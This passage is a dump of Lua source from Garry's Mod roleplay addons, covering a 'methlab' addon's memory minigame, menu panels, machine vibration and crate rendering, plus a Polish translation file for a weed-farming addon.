        zmlab2_Mixer_MiniGame_panel:Remove()
    end

    if self.Sound and self.Sound:IsPlaying() == true then
        self.Sound:Stop()
    end
end

vgui.Register("zmlab2_vgui_Mixer_MiniGame", MiniGameVGUI, "DFrame")

--PATH addons/zeros_methlab2/lua/zmlab2/filter/cl_filter_minigame.lua:
if not CLIENT then return end
local MiniGameVGUI = {}

net.Receive("zmlab2_Filter_MiniGame", function(len)
    zmlab2.Debug_Net("zmlab2_Filter_MiniGame", len)
    LocalPlayer().zmlab2_Filter = net.ReadEntity()

    if IsValid(zmlab2_Filter_MiniGame_panel) then
        zmlab2_Filter_MiniGame_panel:Remove()
    end

    zmlab2_Filter_MiniGame_panel = vgui.Create("zmlab2_vgui_Filter_MiniGame")
end)

function MiniGameVGUI:Init()
    self:SetSize(600 * zmlab2.wM, 300 * zmlab2.hM)
    self:Center()
    self:MakePopup()
    self:ShowCloseButton(false)
    self:SetTitle("")
    self:SetDraggable(true)
    self:SetSizable(false)
    self:DockPadding(0, 0, 0, 0)

    self.GamePhase = 0
    /*
        0 = Wait
        1 = PreviewSequence
        2 = Player repeats the sequence
    */
    self.StartTime = CurTime()
    self.PlayMusic = true
    self.ActiveSequenceID = 1

    // Generate the button sequence
    self.Sequence_Length = 4
    if IsValid(LocalPlayer().zmlab2_Filter) and LocalPlayer().zmlab2_Filter:GetClass() == "zmlab2_machine_filter" then
        local difficulty = zmlab2.Meth.GetDifficulty(LocalPlayer().zmlab2_Filter:GetMethType())
        local extraCount = (3 / 10) * difficulty
        self.Sequence_Length = 2 + math.Round(extraCount)
    end
    self.ButtonSequence = {}
    for i = 1, self.Sequence_Length do table.insert(self.ButtonSequence, math.random(1, 3)) end

    // Lets create the buttons
    self.ActionButtons = {}
    local ButtonCount = 3
    local size = 580 / 3
    local BtnContainer = vgui.Create("DPanel", self)
    BtnContainer:Dock(FILL)
    BtnContainer:DockMargin(10 * zmlab2.wM,120 * zmlab2.hM,10 * zmlab2.wM,10 * zmlab2.hM)
    BtnContainer.Paint = function(s, w, h) end
    self.BtnContainer = BtnContainer
    local function AddButton(id,color)
        local btn = vgui.Create("DButton", BtnContainer)
        btn:SetAutoDelete(true)
        btn:SetSize(size * zmlab2.wM, size * zmlab2.hM)
        btn:SetText("")
        btn.Paint = function(s, w, h)
            //draw.RoundedBox(0, 0, 0, w, h, color)

            surface.SetDrawColor(color)
            surface.SetMaterial(zmlab2.materials["item_bg"])
            surface.DrawTexturedRect(0 * zmlab2.wM, 0 * zmlab2.hM, w, h)

            if btn.Preview then
                local Pulse = 1 - math.Clamp((1 / 0.5) * (btn.Preview - CurTime()),0,1)
                surface.SetDrawColor(255,255,255,255 * (1-Pulse))
                surface.SetMaterial(zmlab2.materials["radial_shadow"])
                surface.DrawTexturedRectRotated(w / 2, h / 2, w * Pulse, h * Pulse, 0)
                zmlab2.util.DrawOutlinedBox(0 * zmlab2.wM, 0 * zmlab2.hM, w, h, 6, zmlab2.colors["orange01"])

                if btn.Preview - CurTime() <= 0 then
                    btn.Preview = nil
                end
            else
                zmlab2.util.DrawOutlinedBox(0 * zmlab2.wM, 0 * zmlab2.hM, w, h, 6, color_white)
                if self.GamePhase < 2 then
                    draw.RoundedBox(0, 0, 0, w, h, zmlab2.colors["black03"])
                else
                    if s:IsHovered() then
                        draw.RoundedBox(0, 0, 0, w, h, zmlab2.colors["white02"])
                    end
                end
            end
        end
        btn.DoClick = function(s)
            //zmlab2.vgui.PlaySound("UI/buttonclick.wav")
            if self.GamePhase < 2 then return end
            self:OnButtonPress(s.ButtonID)
        end

        if id == 1 then
            btn:Dock(LEFT)
        elseif id == 2 then
            btn:Dock(FILL)
            btn:DockMargin(10 * zmlab2.wM, 0 * zmlab2.hM, 10 * zmlab2.wM, 0 * zmlab2.hM)
        else
            btn:Dock(RIGHT)
        end

        btn.ButtonID = id
        self.ActionButtons[id] = btn
    end
    for i = 1, ButtonCount do AddButton(i, HSVToColor((360 / ButtonCount) * i, 1, 1)) end

    timer.Simple(3,function()
        if not IsValid(self) then return end
        self:PreviewSequence()
    end)
end

// Shows the player which button to press and in which order
function MiniGameVGUI:PreviewSequence()
    self.GamePhase = 1
    local timerid = "zmlab2_Filter_MiniGame_PreviewSequence_Timer"
    zmlab2.Timer.Remove(timerid)

    local PreviewID = 1
    zmlab2.Timer.Create(timerid,1,0,function()
        if PreviewID > table.Count(self.ButtonSequence) then
            zmlab2.Timer.Remove(timerid)
            self:StartGame()
        end

        local NextButtonID = self.ButtonSequence[PreviewID]
        if IsValid(self.ActionButtons[NextButtonID]) then
            self:PlayButtonSound(NextButtonID)
        end

        PreviewID = PreviewID + 1
    end)
end

function MiniGameVGUI:StartGame()
    self.GamePhase = 2
end

function MiniGameVGUI:PlayButtonSound(ButtonID)
    self.ActionButtons[ButtonID].Preview = CurTime() + 0.5
    if ButtonID == 1 then
        surface.PlaySound("zmlab2/minigame_filter_button01.wav")
    elseif ButtonID == 2 then
        surface.PlaySound("zmlab2/minigame_filter_button02.wav")
    elseif ButtonID == 3 then
        surface.PlaySound("zmlab2/minigame_filter_button03.wav")
    end
end

function MiniGameVGUI:OnButtonPress(ButtonID)
    local WantedID = self.ButtonSequence[self.ActiveSequenceID]

    self:PlayButtonSound(ButtonID)

    if WantedID == ButtonID then

        // Next!
        self.ActiveSequenceID = self.ActiveSequenceID + 1

        if self.ActiveSequenceID > table.Count(self.ButtonSequence) then
            // We are done here, you won!
            self:OnGameWon()
        end
    else
        // Abort, You failed!
        self:OnGameFailed()
    end
end

function MiniGameVGUI:OnGameWon()
    self:EndGame(true)
end

function MiniGameVGUI:OnGameFailed()
    self:EndGame(false)
end

function MiniGameVGUI:EndGame(result)
    self.GamePhase = 3
    if IsValid(self.BtnContainer) then
        self.BtnContainer:Remove()
    end

    if result then
        surface.PlaySound("zmlab2/minigame_won.wav")
    else
        surface.PlaySound("zmlab2/minigame_lost.wav")
    end

    local MainContainer = vgui.Create("DPanel", self)
    MainContainer:SetAlpha(0)
    MainContainer:Dock(FILL)
    MainContainer.Paint = function(s, w, h)
        draw.RoundedBox(0, 0, 0, w, h, zmlab2.colors["black03"])

        if result then
            draw.SimpleText("Won", zmlab2.GetFont("zmlab2_vgui_font00"), w / 2, h / 2, zmlab2.colors["green03"], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        else
            draw.SimpleText("Lost", zmlab2.GetFont("zmlab2_vgui_font00"), w / 2, h / 2, zmlab2.colors["red02"], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        end
    end

    MainContainer:AlphaTo(255, 0.25, 0, function()
        timer.Simple(1, function()
            if not IsValid(self) then return end

            net.Start("zmlab2_Filter_MiniGame")
            net.WriteEntity(LocalPlayer().zmlab2_Filter)
            net.WriteBool(result)
            net.SendToServer()

            self:Close()
        end)
    end)

end



function MiniGameVGUI:Paint(w, h)
    surface.SetDrawColor(zmlab2.colors["blue02"])
    surface.SetMaterial(zmlab2.materials["item_bg"])
    surface.DrawTexturedRect(0 * zmlab2.wM, 0 * zmlab2.hM, w, h)

    local CountDown = math.Clamp((self.StartTime + 3) - CurTime(),0,3)
    if CountDown <= 0 then
        if self.GamePhase == 1 then
            draw.SimpleText("Remember!", zmlab2.GetFont("zmlab2_vgui_font01"), w / 2, 60 * zmlab2.hM, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        elseif self.GamePhase == 2 then
            draw.SimpleText("Repeat!", zmlab2.GetFont("zmlab2_vgui_font01"), w / 2, 60 * zmlab2.hM, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        end
    else
        draw.SimpleText(math.Round(CountDown), zmlab2.GetFont("zmlab2_vgui_font01"), w / 2, 60 * zmlab2.hM, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    zmlab2.util.DrawOutlinedBox(0 * zmlab2.wM, 0 * zmlab2.hM, w, h, 2, color_white)
end

function MiniGameVGUI:Think()

    if self.GamePhase == 2 and input.IsKeyDown(KEY_ESCAPE) then
        self:Close()
    end

    if self.PlayMusic == true then
        if self.Sound == nil then
            self.Sound = CreateSound(LocalPlayer().zmlab2_Filter, "zmlab2_minigame_loop")
        else
            if self.Sound:IsPlaying() == false then
                self.Sound:Play()
                self.Sound:ChangeVolume(1, 1)
            end
        end
    else
        if self.Sound and self.Sound:IsPlaying() == true then
            self.Sound:Stop()
        end
    end
end

function MiniGameVGUI:Close()

    zmlab2.Timer.Remove("zmlab2_Filter_MiniGame_PreviewSequence_Timer")

    self.PlayMusic = false
    if self.Sound and self.Sound:IsPlaying() == true then self.Sound:Stop() end
    LocalPlayer().zmlab2_Filter = nil

    if IsValid(zmlab2_Filter_MiniGame_panel) then
        zmlab2_Filter_MiniGame_panel:Remove()
    end

    if self.Sound and self.Sound:IsPlaying() == true then
        self.Sound:Stop()
    end
end

vgui.Register("zmlab2_vgui_Filter_MiniGame", MiniGameVGUI, "DFrame")

--PATH addons/zeros_methlab2/lua/zmlab2/generic/cl_vgui.lua:
if SERVER then return end

zmlab2 = zmlab2 or {}
zmlab2.Interface = zmlab2.Interface or {}


local VGUIItem = {}

local MainPanel

local Tooltip_pnl

function zmlab2.Interface.Create(w,h,title,AppendContent)
    if IsValid(MainPanel) then MainPanel:Remove() end

    local LastHovered
    zmlab2.Hook.Remove("Think", "Interface_Hover")
    zmlab2.Hook.Add("Think", "Interface_Hover", function()
        local pnl = vgui.GetHoveredPanel()

        if pnl ~= LastHovered then
            LastHovered = pnl

            // Delete old tooltip
            if IsValid(Tooltip_pnl) then Tooltip_pnl:Remove() end

            // If the new hovered panel has tooltip data then lets rebuild the tooltip
            if IsValid(pnl) and pnl.ToolTipData and (pnl.IsLocked == nil or pnl.IsLocked == false) then
                zmlab2.Interface.CreateTooltip(pnl.ToolTipData.t_mdldata,pnl.ToolTipData.s_name,pnl.ToolTipData.s_money,pnl.ToolTipData.data)
            end
        end
    end)

    MainPanel = vgui.Create("zmlab2_vgui_main")
    MainPanel:SetSize(w * zmlab2.wM, h * zmlab2.hM)
    MainPanel:Center()

    local font = zmlab2.GetFont("zmlab2_vgui_font01")
    local txtSize = zmlab2.util.GetTextSize(title,font)
    if txtSize >= 200 * zmlab2.wM then font = zmlab2.GetFont("zmlab2_vgui_font03") end


    MainPanel.Title:SetFont(font)
    MainPanel.Title:SetText(title)
    MainPanel.Title:SizeToContentsX(15)

    pcall(AppendContent,MainPanel)
end

function VGUIItem:Init()
    self:SetSize(15 * zmlab2.wM, 15 * zmlab2.hM)
    self:Center()
    self:MakePopup()
    self:ShowCloseButton(false)
    self:SetTitle("")
    self:SetDraggable(true)
    self:SetSizable(false)

    self:DockMargin(0, 0, 0, 0)
    self:DockPadding( 10 * zmlab2.wM,10 * zmlab2.wM,10 * zmlab2.wM,10 * zmlab2.wM)

    local TopContainer = vgui.Create("DPanel", self)
    TopContainer:SetAutoDelete(true)
    TopContainer:SetSize(self:GetWide(), 50 * zmlab2.hM)
    TopContainer.Paint = function(s, w, h)
        zmlab2.util.DrawOutlinedBox(0 * zmlab2.wM, 0 * zmlab2.hM, w - 55 * zmlab2.wM, h, 2, color_white)
    end
    TopContainer:Dock(TOP)

    local close_btn = zmlab2.vgui.ImageButton(self:GetWide() - 49 * zmlab2.wM,0,50 * zmlab2.wM,50 * zmlab2.hM,TopContainer,zmlab2.materials["close"],function()
        self:Close()
    end,function()
        return false
    end)
    close_btn:Dock(RIGHT)


    local TitleBox = vgui.Create("DLabel", TopContainer)
    TitleBox:SetAutoDelete(true)
    TitleBox:SetSize(200 * zmlab2.wM, 50 * zmlab2.hM)
    TitleBox:SetPos(0 * zmlab2.wM, 0 * zmlab2.hM)
    TitleBox:Dock(LEFT)
    TitleBox:SetText("Test")
    TitleBox:SetTextColor(color_white)
    TitleBox:SetFont(zmlab2.GetFont("zmlab2_vgui_font01"))
    TitleBox:SetContentAlignment(5)
    self.Title = TitleBox
end

function VGUIItem:Paint(w, h)
    surface.SetDrawColor(zmlab2.colors["blue02"])
    surface.SetMaterial(zmlab2.materials["item_bg"])
    surface.DrawTexturedRect(0 * zmlab2.wM, 0 * zmlab2.hM, w,h)

    zmlab2.util.DrawOutlinedBox(0 * zmlab2.wM, 0 * zmlab2.hM, w, h, 2, color_white)
end

function VGUIItem:Close()
    if IsValid(Tooltip_pnl) then
        Tooltip_pnl:Remove()
    end

    if IsValid(MainPanel) then
        MainPanel:Remove()
    end

    zmlab2.Hook.Remove("Think", "Interface_Hover")
end

vgui.Register("zmlab2_vgui_main", VGUIItem, "DFrame")

function zmlab2.Interface.CreateTooltip(t_mdldata, s_name, s_money, data)
    if IsValid(Tooltip_pnl) then
        Tooltip_pnl:Remove()
    end

    if not IsValid(MainPanel) then return end

    local ToolTipSize = MainPanel:GetTall()
    local x, y = MainPanel:GetPos()

    local main_pnl = vgui.Create("DPanel")
    main_pnl:ParentToHUD()
    main_pnl:SetSize(ToolTipSize, ToolTipSize)
    main_pnl:SetPos(x - ToolTipSize - 5 * zmlab2.wM, y)
    main_pnl.Paint = function(s, w, h)
        surface.SetDrawColor(zmlab2.colors["blue02"])
        surface.SetMaterial(zmlab2.materials["item_bg"])
        surface.DrawTexturedRect(0 * zmlab2.wM, 0 * zmlab2.hM, w, h)
        //zmlab2.util.DrawOutlinedBox(0 * zmlab2.wM, 0 * zmlab2.hM, w, h, 2, color_white)
    end
    Tooltip_pnl = main_pnl

    local tt_img = zmlab2.vgui.ModelPanel(t_mdldata)
    tt_img:SetSize(ToolTipSize, ToolTipSize)
    tt_img:SetParent(main_pnl)
    tt_img:DockPadding(10 * zmlab2.hM, 5 * zmlab2.hM, 10 * zmlab2.hM, 10 * zmlab2.hM)
    tt_img.PostDrawModel = function(s,ent)
        cam.Start2D()
            local desc_height = 1 * zmlab2.hM
            if tt_img.desc then desc_height = tt_img.desc:GetTall() + 10 * zmlab2.hM end

            local bg_h = desc_height + 50 * zmlab2.hM
            surface.SetDrawColor(zmlab2.colors["black04"])
            surface.SetMaterial(zmlab2.materials["linear_gradient"])
            surface.DrawTexturedRectRotated(ToolTipSize / 2, bg_h / 2, ToolTipSize,bg_h, 180)

            zmlab2.util.DrawOutlinedBox(0 * zmlab2.wM, 0 * zmlab2.hM, ToolTipSize, ToolTipSize, 2, color_white)
        cam.End2D()
    end
    tt_img.LayoutEntity = function(s,ent)
        ent:SetAngles(Angle(0,CurTime() * 7,0))
    end


    local function AddItem(txt01, font, _dock, align)
        local pnl = vgui.Create("DLabel", tt_img)
        pnl:SetAutoDelete(true)
        pnl:SetAutoStretchVertical(true)
        pnl:SetSize(ToolTipSize, ToolTipSize)
        pnl:Dock(_dock)
        pnl:SetText(txt01)
        pnl:SetTextColor(color_white)
        pnl:SetFont(font)
        pnl:SetContentAlignment(align or 4)
        pnl:SetWrap(true)
        pnl.Paint = function(s, w, h)
            //draw.RoundedBox(0, 0 * zmlab2.wM, 0 * zmlab2.hM,w,h, zmlab2.colors["black02"])
        end
        return pnl
    end

    if s_name then
        local font = zmlab2.GetFont("zmlab2_vgui_font01")
        local txtSize = zmlab2.util.GetTextSize(s_name,font)
        if txtSize >  350 * zmlab2.hM then font = zmlab2.GetFont("zmlab2_vgui_font03") end
        AddItem(s_name, font, TOP, 7)
    end

    if data.desc then
        local pnl = AddItem(data.desc, zmlab2.GetFont("zmlab2_vgui_font06"), TOP)
        pnl:DockMargin(0 * zmlab2.hM, 5 * zmlab2.hM, 0 * zmlab2.hM, 5 * zmlab2.hM)
        tt_img.desc = pnl
    end

    local BoxSize = 40 * zmlab2.hM
    local function AddItemBox(txt01,txt02,txt02_color)

        local font = zmlab2.GetFont("zmlab2_vgui_font02")

        local pnl = vgui.Create("DPanel", tt_img)
        pnl:SetAutoDelete(true)
        pnl:SetSize(BoxSize, BoxSize)
        pnl:Dock(BOTTOM)
        pnl:DockMargin(0,5 * zmlab2.hM,0,0)
        pnl.Paint = function(s, w, h)
            draw.RoundedBox(0, 0 * zmlab2.wM, 0 * zmlab2.hM,w,h, zmlab2.colors["black03"])

            draw.SimpleText(txt01,font, 10 * zmlab2.wM, h / 2, color_white, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)

            draw.SimpleText(txt02,font, w - 10 * zmlab2.wM, h / 2, txt02_color, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
        end
        return pnl
    end

    if data.filter_time and data.mix_time and data.vent_time then
        local time = data.filter_time + (data.mix_time * 2) + data.vent_time
        AddItemBox(zmlab2.language["Duration"], zmlab2.util.FormatTime(time), color_white)
    end

    if data.batch_size then
        AddItemBox(zmlab2.language["Amount"], data.batch_size .. zmlab2.config.UoM, zmlab2.colors["orange01"])
    end

    if data.difficulty then

        local function GetDiffColor(a, b, c, t)
            if (t < 0.5) then
                return zmlab2.util.LerpColor(t / 0.5, a, b)
            else
                return zmlab2.util.LerpColor((t - 0.5) / 0.5, b, c)
            end
        end

        local fract = (1 / 10) * data.difficulty
        local diff_col = GetDiffColor(zmlab2.colors["green03"],zmlab2.colors["orange01"],zmlab2.colors["red02"],fract)

        local diff_str = ""
        if data.difficulty <= 3 then
            diff_str = zmlab2.language["Difficulty_Easy"]
        elseif data.difficulty <= 6 then
            diff_str = zmlab2.language["Difficulty_Medium"]
        elseif data.difficulty <= 9 then
            diff_str = zmlab2.language["Difficulty_Hard"]
        else
            diff_str = zmlab2.language["Difficulty_Expert"]
        end

        AddItemBox(zmlab2.language["Difficulty"], diff_str, diff_col)
    end

    if s_money then
        AddItemBox(zmlab2.language["Money"], s_money, zmlab2.colors["green03"])
    end
end

function zmlab2.Interface.AddColorList(pnl, list, isLocked, isSelected, onClick, prePopulate)
    local MainContainer = vgui.Create("DIconLayout", pnl)
    MainContainer:Dock(FILL)
    MainContainer:DockMargin(0 * zmlab2.wM, 10 * zmlab2.hM, 0 * zmlab2.wM, 0)
    MainContainer:SetSpaceX(10 * zmlab2.wM)
    MainContainer:SetSpaceY(10 * zmlab2.wM)
    MainContainer.Paint = function(s, w, h) end

    MainContainer:InvalidateParent(true)

    local item_size = MainContainer:GetWide() / 5
    item_size = item_size - (8 * zmlab2.wM)
    pcall(prePopulate, MainContainer, item_size)

    for k, v in ipairs(list) do
        local _, b_isLocked = pcall(isLocked, k)
        local itm = MainContainer:Add("DButton")
        itm:SetAutoDelete(true)
        itm:SetSize(item_size, item_size)
        itm:SetText("")

        itm.Paint = function(s, w, h)
            if b_isLocked == false then
                draw.RoundedBox(0, 0, 0, w, h, v)

                if IsValid(LocalPlayer().zmlab2_Tent) and LocalPlayer().zmlab2_Tent:GetColorID() == k then
                    zmlab2.util.DrawOutlinedBox(0, 0, w, h, 2, color_white)
                end

                if s:IsHovered() then
                    draw.RoundedBox(0, 0, 0, w, h, zmlab2.colors["white02"])
                end
            else
                surface.SetDrawColor(zmlab2.colors["grey02"])
                surface.SetMaterial(zmlab2.materials["item_locked"])
                surface.DrawTexturedRect(0 * zmlab2.wM, 0 * zmlab2.hM, w, h)
            end
        end

        itm.DoClick = function(s)
            zmlab2.vgui.PlaySound("UI/buttonclick.wav")
            if b_isLocked == true then return end
            pcall(onClick, k)
        end
    end

    MainContainer:Center()
end

function zmlab2.Interface.AddModelList(pnl,list,isLocked,isSelected,onClick,getData,prePopulate)

    // Add scrollbar if we got more items
    local MainContainer,SubSize
    if table.Count(list) > 8 then
        local MainScroll = vgui.Create( "DScrollPanel", pnl )
        MainScroll:Dock( FILL )
        MainScroll:DockMargin(0 * zmlab2.wM,10 * zmlab2.hM,0 * zmlab2.wM,0 * zmlab2.hM)
        MainScroll.Paint = function(s, w, h)
            draw.RoundedBox(0, 0, 0, w, h, zmlab2.colors["black02"])
        end
        local sbar = MainScroll:GetVBar()
        SubSize = sbar:GetWide()
        sbar:SetHideButtons( true )
        function sbar:Paint(w, h)
            draw.RoundedBox(0, 0, 0, w, h, zmlab2.colors["black02"])
        end
        function sbar.btnUp:Paint(w, h)
            draw.RoundedBox(0, 0, 0, w, h, zmlab2.colors["blue02"])
        end
        function sbar.btnDown:Paint(w, h)
            draw.RoundedBox(0, 0, 0, w, h, zmlab2.colors["blue02"])
        end
        function sbar.btnGrip:Paint(w, h)
            draw.RoundedBox(0, 0, 0, w, h, zmlab2.colors["blue02"])
        end

        MainContainer = vgui.Create("DIconLayout", MainScroll)
        MainContainer:Dock(FILL)
        //MainContainer:DockMargin(0 * zmlab2.wM, 10 * zmlab2.hM, 0 * zmlab2.wM, 0)
        MainContainer:SetSpaceX(10 * zmlab2.wM)
        MainContainer:SetSpaceY(10 * zmlab2.wM)
        MainContainer.Paint = function(s, w, h)
            //draw.RoundedBox(0, 0, 0, w, h, color_white)
        end
    else
        MainContainer = vgui.Create("DIconLayout", pnl)
        MainContainer:Dock(FILL)
        MainContainer:DockMargin(0 * zmlab2.wM, 10 * zmlab2.hM, 0 * zmlab2.wM, 0)
        MainContainer:SetSpaceX(10 * zmlab2.wM)
        MainContainer:SetSpaceY(10 * zmlab2.wM)
        MainContainer.Paint = function(s, w, h)
            //draw.RoundedBox(0, 0, 0, w, h, color_white)
        end

        SubSize = 13 * zmlab2.wM
    end


    pnl:InvalidateParent(true)
    local item_size = pnl:GetWide() / 4
    item_size = item_size - SubSize

    pcall(prePopulate,MainContainer,item_size)

    for k, v in ipairs(list) do

        local _,b_isLocked = pcall(isLocked,k)

        local itm =  MainContainer:Add("DPanel")
        itm:SetAutoDelete(true)
        itm:SetSize(item_size, item_size)
        itm.Paint = function(s, w, h)
            surface.SetDrawColor(zmlab2.colors["blue02"])
            surface.SetMaterial(zmlab2.materials["item_bg"])
            surface.DrawTexturedRect(0 * zmlab2.wM, 0 * zmlab2.hM, w,h)

            draw.RoundedBox(0, 0, 0, w, h, zmlab2.colors["black02"])
        end

        //if b_isLocked == true then continue end

        local _,t_mdldata,s_name,s_money = pcall(getData,v)

        local mdl = zmlab2.vgui.ModelPanel(t_mdldata)
        mdl:SetParent(itm)
        mdl:SetAutoDelete(true)
        mdl:Dock(FILL)
        mdl:DockMargin(5 * zmlab2.wM,5 * zmlab2.hM,5 * zmlab2.wM,5 * zmlab2.hM)

        local Button = vgui.Create("DButton", itm)
        Button:Dock(FILL)
        Button:SetText("")
        Button.IsLocked = b_isLocked

        local font = zmlab2.GetFont("zmlab2_vgui_font02")
        local txtSize = zmlab2.util.GetTextSize(s_name,font)
        if txtSize >= item_size then font = zmlab2.GetFont("zmlab2_vgui_font05") end

        Button.Paint = function(s, w, h)
            if s.IsLocked then
                zmlab2.util.DrawBlur(s, 1, 5)

                surface.SetDrawColor(color_white)
                surface.SetMaterial(zmlab2.materials["icon_locked"])
                surface.DrawTexturedRectRotated(w / 2, h / 2, w * 0.7, h * 0.7, 0)
            else
                surface.SetDrawColor(zmlab2.colors["black01"])
                surface.SetMaterial(zmlab2.materials["linear_gradient"])
                surface.DrawTexturedRectRotated(w / 2, 15 * zmlab2.hM, w, 30 * zmlab2.hM, 180)

                draw.SimpleText(s_name, font, 7 * zmlab2.wM,4 * zmlab2.hM, color_white, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
            end

            local _,b_isSelected = pcall(isSelected,k)
            if b_isSelected == true then
                zmlab2.util.DrawOutlinedBox(0 * zmlab2.wM, 0 * zmlab2.hM, w, h, 2, zmlab2.colors["orange01"])
            else
                zmlab2.util.DrawOutlinedBox(0 * zmlab2.wM, 0 * zmlab2.hM, w, h, 2, color_white)
            end

            if s:IsHovered() then draw.RoundedBox(0, 0, 0, w, h, zmlab2.colors["white03"]) end
        end
        Button.DoClick = function(s)
            zmlab2.vgui.PlaySound("UI/buttonclick.wav")
            if s.IsLocked then

                return
            end
            pcall(onClick,k)
        end

        Button.ToolTipData = {
            t_mdldata = t_mdldata,
            s_name = s_name,
            s_money = s_money,
            data = v
        }
    end

    MainContainer:Center()
end

--PATH addons/zeros_methlab2/lua/zmlab2/generic/cl_vibrate.lua:
if SERVER then return end

zmlab2 = zmlab2 or {}
zmlab2.VibrationSystem = zmlab2.VibrationSystem or {}

/*

    This system vibrates certain bones of machines

*/

local function RandomJiggle(Machine,boneID,intensity,Fade)
    local amount = 0.1 * intensity * Fade
    local vibrate = math.Rand(-amount, amount)
    Machine:ManipulateBonePosition(boneID, Vector(vibrate, vibrate, vibrate))
end

function zmlab2.VibrationSystem.Run(Machine,enabled,intensity)
    if zmlab2.util.InDistance(Machine:GetPos(), LocalPlayer():GetPos(), 150) == false then return end

    // Here we calculate the fade in multiplier
    local Fade = 1
    if Machine.LastState ~= enabled then
        Machine.LastState = enabled
        Machine.VibrationChange = CurTime()
    end
    Fade = math.Clamp((1 / 3) * (CurTime() - Machine.VibrationChange), 0, 1)

    // Here we jiggle the pickle
    for boneID = 1, Machine:GetBoneCount() do
        local boneName = Machine:GetBoneName(boneID)

        if boneName and string.sub(boneName, 1, 7) == "vibrate" then
            if enabled then
                RandomJiggle(Machine,boneID,intensity,Fade)
            else
                if Fade >= 1 then
                    Machine:ManipulateBonePosition(boneID, vector_origin)
                else
                    RandomJiggle(Machine,boneID,intensity,1-Fade)
                end
            end
        end
    end
end

--PATH addons/zeros_methlab2/lua/zmlab2/crate/cl_crate.lua:
if not CLIENT then return end
zmlab2 = zmlab2 or {}
zmlab2.Crate = zmlab2.Crate or {}

function zmlab2.Crate.Initialize(Crate)
    timer.Simple(0.1,function()
        if not IsValid(Crate) then return end
        Crate.Initialized = true
    end)
end

function zmlab2.Crate.Draw(Crate)

    if Crate.Initialized and zmlab2.util.InDistance(Crate:GetPos(), LocalPlayer():GetPos(), 350) then

        if zmlab2.Convar.Get("zmlab2_cl_drawui") == 1 then zmlab2.Meth.DrawHUD(Crate:GetPos() + Vector(0,0,25),0.1,Crate:GetMethType(),Crate:GetMethAmount(),Crate:GetMethQuality()) end

        if Crate:GetMethAmount() ~= Crate.CurMethAmount then
            Crate.CurMethAmount = Crate:GetMethAmount()
            zmlab2.Crate.UpdateMethMaterial(Crate)
        end

        // Update the material once it gets drawn
        if Crate.LastDraw and CurTime() > (Crate.LastDraw + 0.1) then
            zmlab2.Crate.UpdateMethMaterial(Crate)
        end

        Crate.LastDraw = CurTime()
    end
end

function zmlab2.Crate.UpdateMethMaterial(Crate)
    //zmlab2.Debug("zmlab2.Crate.UpdateMethMaterial")

    if Crate:GetMethAmount() <= 0 then return end
    if Crate:GetMethType() <= 0 then return end
    local MethMat = zmlab2.Meth.GetMaterial(Crate:GetMethType(),Crate:GetMethQuality())
    Crate:SetSubMaterial(0, "!" .. MethMat)
end


--PATH addons/zeros_weedfarm/lua/zwf_languages/sh_zwf_language_pl.lua:
// Translated by Kyo - https://steamcommunity.com/id/KyokoKirigi

zwf = zwf or {}
zwf.language = zwf.language or {}

zwf.language.General = zwf.language.General or {}
zwf.language.Shop = zwf.language.Shop or {}
zwf.language.NPC = zwf.language.NPC or {}
zwf.language.VGUI = zwf.language.VGUI or {}
zwf.language.Settings = zwf.language.Settings or {}


if (zwf.config.SelectedLanguage == "pl") then

    zwf.language.General["Fuel"] = "Paliwo"

    zwf.language.General["THC"] = "THC"
    zwf.language.General["Remove"] = "Wyjmij"
    zwf.language.General["Splice"] = "Spleć" // The splice button on the seed lab for creating new seeds

    zwf.language.General["Bad"] = "Źle"
    zwf.language.General["Good"] = "Dobrze"

    zwf.language.General["Collect"] = "Zbierz"

    zwf.language.General["Speed"] = "Prędkość wzrostu"
    zwf.language.General["Productivity"] = "Bonus do zbioru"
    zwf.language.General["AntiPlague"] = "Anty Plaga"

    zwf.language.General["Water"] = "Woda"

    zwf.language.General["invalid_character"] = "Nazwa posiada niedozwolone znaki!"
    zwf.language.General["name_too_short"] = "Nazwa nasiona jest zbyt krótka!"
    zwf.language.General["name_too_long"] = "Nazwa nasiona jest zbyt długa!"

    zwf.language.General["Cancel"] = "Anuluj"
    zwf.language.General["Enter"] = "Potwierdź"

    zwf.language.General["ItemBought"] = "Zakupiono $itemname za $currency$price!"


    zwf.language.General["seedlab_titlescreen"] = "Laboratorium nasion"
    zwf.language.General["seedlab_help"] = "Podaj nazwę zmodyfikowanego "

    zwf.language.General["watertank_refill"] = "Uzupełnij"
    zwf.language.General["watertank_title"] = "Zbiornik z wodą"

    zwf.language.General["bong_pickup_fail"] = "Posiadasz juz to bongo!"
    zwf.language.General["bong_no_weed"] = "Brak marihuany!"

    zwf.language.General["generator_repair"] = "Napraw!"
    zwf.language.General["generator_start"] = "Start"
    zwf.language.General["generator_stop"] = "Stop"
    zwf.language.General["generator_nofuel"] = "Brak paliwa!"

    zwf.language.General["packingstation_info"] = "Dodaj słoiki z marihuaną"
    zwf.language.General["packingstation_weedmix"] = "Zmodyfikowana marihuana" // If the player mixes diffrent sorts of weed together then we change the name of the weed to this

    zwf.language.General["seedbank_full"] = "Bank nasion jest pełen!"

    zwf.language.General["plant_heal"] = "Uzdrów" // The heal button
    zwf.language.General["plant_harvest"] = "Zetnij" // The harvest button
    zwf.language.General["plant_infected"] = "Zainfekowana!" // Tells us that the plant is infected
    zwf.language.General["plant_postgrow"] = "Faza początkowa" // Tells us that the plant is in the post grow phase where it keeps growing till it reaches its max weedamount
    zwf.language.General["plant_empty"] = "Puste" // Tells the player that the flowerpot is empty

    zwf.language.General["not_enough_money"] = "Nie masz wystarczająco pieniędzy!"
    zwf.language.General["not_correct_rank"] = "Nie masz odpowiedniej do tego rangi!"
    zwf.language.General["entity_limit"] = "Osiągnąłeś limit $itemname!"


    zwf.language.General["CableDistanceFail"] = "Za duży dystans dzieli te dwa obiekty!"

    zwf.language.General["BongSharingFail"] = "Gracz $PlayerName posiada juz to bongo!"

    zwf.language.General["WeedBlock"] = "Blok zioła"

    zwf.language.General["WrongJob"] = "Nieprawidłowa praca!"


